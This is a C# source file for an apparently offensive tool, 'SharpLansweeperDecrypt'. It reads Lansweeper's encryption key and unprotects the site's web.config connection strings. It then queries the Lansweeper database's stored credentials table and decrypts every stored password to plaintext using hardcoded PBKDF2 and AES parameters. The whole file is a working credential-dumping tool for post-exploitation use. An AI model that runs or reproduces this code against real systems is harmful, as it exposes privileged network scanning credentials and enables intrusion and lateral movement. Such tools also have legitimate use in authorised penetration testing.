using System;
using System.Data.SqlClient;
using System.IO;
using System.Security.Cryptography;
using System.Configuration;
using System.Linq;

namespace SharpLansweeperDecrypt
{
    class Program
    {
        static void Main(string[] args)
        {
            Console.WriteLine("╔═╗┬ ┬┌─┐┬─┐┌─┐╦  ┌─┐┌┐┌┌─┐┬ ┬┌─┐┌─┐┌─┐┌─┐┬─┐╔╦╗┌─┐┌─┐┬─┐┬ ┬┌─┐┌┬┐");
            Console.WriteLine("╚═╗├─┤├─┤├┬┘├─┘║  ├─┤│││└─┐│││├┤ ├┤ ├─┘├┤ ├┬┘ ║║├┤ │  ├┬┘└┬┘├─┘ │ ");
            Console.WriteLine("╚═╝┴ ┴┴ ┴┴└─┴  ╩═╝┴ ┴┘└┘└─┘└┴┘└─┘└─┘┴  └─┘┴└─═╩╝└─┘└─┘┴└─ ┴ ┴   ┴ ");
            Console.WriteLine();

            string encryptionKeyPath = @"C:\Program Files (x86)\Lansweeper\Key\Encryption.txt";
            string encryptedPassword = null;

            if (args.Contains("-h") || args.Contains("--help"))
            {
                Console.WriteLine("Usage:");
                Console.WriteLine("  No arguments: Runs the program as is, decrypting web.config and connecting to the SQL database.");
                Console.WriteLine("  -p <path>: Optional path to the encryption key. If not provided, a default path is used.");
                Console.WriteLine("  -e <encryptedPassword>: Decrypts the provided encrypted password without decrypting web.config or connecting to the SQL database.");
                return;
            }

            int pathIndex = Array.IndexOf(args, "-p");
            if (pathIndex != -1 && args.Length > pathIndex + 1)
            {
                encryptionKeyPath = args[pathIndex + 1];
                if (!File.Exists(encryptionKeyPath))
                {
                    Console.WriteLine("[ERROR] The specified encryption key file was not found.");
                    return;
                }
            }

            int passwordIndex = Array.IndexOf(args, "-e");
            if (passwordIndex != -1 && args.Length > passwordIndex + 1)
            {
                encryptedPassword = args[passwordIndex + 1];
            }

            if (!string.IsNullOrEmpty(encryptedPassword))
            {
                string decryptedPassword = DecryptPassword(File.ReadAllBytes(encryptionKeyPath), encryptedPassword);
                Console.WriteLine("Decrypted Password: " + decryptedPassword);
                return;
            }

            Console.WriteLine("[+] Loading web.config file...");
            var configMap = new ExeConfigurationFileMap { ExeConfigFilename = @"C:\Program Files (x86)\Lansweeper\Website\web.config" };
            Configuration config = ConfigurationManager.OpenMappedExeConfiguration(configMap, ConfigurationUserLevel.None);
            ConnectionStringsSection section = config.GetSection("connectionStrings") as ConnectionStringsSection;

            if (section != null && section.SectionInformation.IsProtected)
            {
                section.SectionInformation.UnprotectSection();
                Console.WriteLine("[+] Decrypted connectionStrings section:");

                string connectionString = null;

                foreach (ConnectionStringSettings css in section.ConnectionStrings)
                {
                    if (css.Name == "lansweeper")
                    {
                        connectionString = css.ConnectionString;
                        break;
                    }
                }

                if (!string.IsNullOrEmpty(connectionString))
                {
                    Console.WriteLine("Using connectionString: " + connectionString);
                    try
                    {
                        using (var connection = new SqlConnection(connectionString))
                        {
                            connection.Open();
                            Console.WriteLine("[+] Opening connection to the database...");

                            var query = "SELECT credname, username, password FROM lansweeperdb.dbo.tsysCredentials";
                            var command = new SqlCommand(query, connection);

                            Console.WriteLine("[+] Retrieving credentials from the database...");
                            using (var reader = command.ExecuteReader())
                            {
                                while (reader.Read())
                                {
                                    var credname = reader["credname"].ToString();
                                    var username = reader["username"].ToString();
                                    var dbEncryptedPassword = reader["password"].ToString();
                                    if (!string.IsNullOrWhiteSpace(dbEncryptedPassword))
                                    {
                                        var decryptedPassword = DecryptPassword(File.ReadAllBytes(encryptionKeyPath), dbEncryptedPassword);
                                        Console.WriteLine("[+] Credential decrypted successully");
                                        Console.WriteLine("┌───────────────────────────────────────┐");
                                        Console.WriteLine($"│ Credential: {credname.PadRight(26)}│");
                                        Console.WriteLine($"│ Username:   {username.PadRight(26)}│");
                                        Console.WriteLine($"│ Password:   {decryptedPassword.PadRight(26)}│");
                                        Console.WriteLine("└───────────────────────────────────────┘");
                                    }
                                }
                            }
                        }
                    }
                    catch (Exception ex)
                    {
                        Console.WriteLine($"[ERROR] An error occurred while processing the database: {ex.Message}. Database connection failed, please access and decrypt credentials manually with the -e flag.");
                    }
                    finally
                    {
                        Console.WriteLine("[+] Database connection closed.");
                    }
                }
                else
                {
                    Console.WriteLine("[ERROR] Specific connection string 'lansweeper' was not found.");
                }
            }
            else
            {
                Console.WriteLine("[ERROR] The connectionStrings section is either not encrypted or not found.");
            }
        }

        static string DecryptPassword(byte[] key, string cipherText)
        {
            try
            {
                byte[] Salt = new byte[] { 39, 15, 41, 17, 43, 19, 45, 21 };
                int Iter = 10000;
                int AESKeySize = 16;
                using (var pbkdf2 = new Rfc2898DeriveBytes(key, Salt, Iter))
                {
                    byte[] AESKey = pbkdf2.GetBytes(AESKeySize);
                    byte[] cipherBytes = Convert.FromBase64String(cipherText);
                    byte[] iv = new byte[16];
                    Array.Copy(cipherBytes, 0, iv, 0, iv.Length);
                    byte[] cipher = new byte[cipherBytes.Length - iv.Length];
                    Array.Copy(cipherBytes, iv.Length, cipher, 0, cipher.Length);

                    using (Aes aes = Aes.Create())
                    {
                        aes.Key = AESKey;
                        aes.IV = iv;
                        aes.Padding = PaddingMode.PKCS7;
                        using (var decryptor = aes.CreateDecryptor(aes.Key, aes.IV))
                        {
                            using (var ms = new MemoryStream(cipher))
                            {
                                using (var cs = new CryptoStream(ms, decryptor, CryptoStreamMode.Read))
                                {
                                    using (var sr = new StreamReader(cs))
                                    {
                                        return sr.ReadToEnd();
                                    }
                                }
                            }
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[ERROR] An error occurred during password decryption: {ex.Message}");
                return null;
            }
        }
    }
}